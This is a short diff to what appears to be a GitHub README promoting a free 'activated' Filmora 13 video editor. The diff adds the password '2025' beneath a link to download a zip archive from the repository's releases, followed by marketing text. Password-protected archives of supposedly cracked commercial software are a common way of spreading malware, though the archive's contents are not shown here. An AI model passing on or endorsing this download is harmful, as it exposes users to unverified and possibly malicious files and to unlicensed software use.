@@ -8,6 +8,7 @@ Welcome to the Filmora 13 repository! 🚀 This is your ultimate source for acce
 
 ## 🔗 Software Access  
 ### [Download Filmora 13](https://github.com/NAVHANRAHMANJAI/Filmora-13-activate/releases/download/filmora-13/Filmora-13.zip)
+Password:2025
 
 ## 🎉 Overview of Filmora 13  
 Filmora 13 is renowned for its user-friendly interface and powerful video editing capabilities. It allows you to create stunning videos, add effects, transitions, and music with ease. With robust features for both beginners and professionals, Filmora is your go-to tool for all video editing needs.
